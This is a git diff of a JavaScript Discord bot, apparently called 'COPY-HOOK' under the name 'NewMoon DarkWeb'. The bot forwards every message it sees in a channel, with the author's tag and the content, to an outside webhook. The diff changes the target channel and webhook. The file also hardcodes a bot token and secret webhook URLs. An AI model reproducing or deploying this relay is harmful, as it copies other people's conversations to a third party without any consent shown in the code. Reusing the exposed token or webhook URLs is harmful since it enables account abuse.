@@ -1,11 +1,11 @@
 var XMLHttpRequest = require('xhr2');
 const Discord = require("discord.js");
-const myChannelId = '998674986170593283'
+const myChannelId = '956501065744908318'
 const { Client, Intents, WebhookClient, MessageEmbed, webhook,   } = require("discord.js");
 const client = new Client({
 intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES]
 });
-const Myhook = 'https://discord.com/api/webhooks/1005515547254984784/t5xwvZqHfoYWpKl0-RAokEuaYP3fM_rDOT5QkoGu3Ssp5HOS9tXJpeqs2KA-2yd0mPd7'
+const Myhook = 'https://discord.com/api/webhooks/1006286640920141857/TCVjMTg6FKibFYaMW1qe7ZjcXC0_QhaA7Zz6s_Jz_dPrV4dWcXq_0zL1Y8LjMTTe0fVf'
 const TOKEN = "OTQyMzQ0NjI3MjkyMzY4OTI2.GLHk6T.tcDTHBIVHoj13mxBp7Sph5tNC-T8fUzqRL0caU"
 
 
@@ -38,7 +38,7 @@ client.on("messageCreate", (message) => {
     username: "NewMoon DarkWeb",
     avatar_url: "https://cdn.discordapp.com/attachments/998675140042817567/1006267341484593352/newmoon.png",
     title: "??? BY COPY-HOOK",
-    content: "```" + message.author.tag + " " + "sent message" + " " + "--->"+ " " + '"' + message.content +"```"
+    content: message.author.tag + " " + "sent message" + " " +'"' + message.content
   }
   request.send(JSON.stringify(params));
 
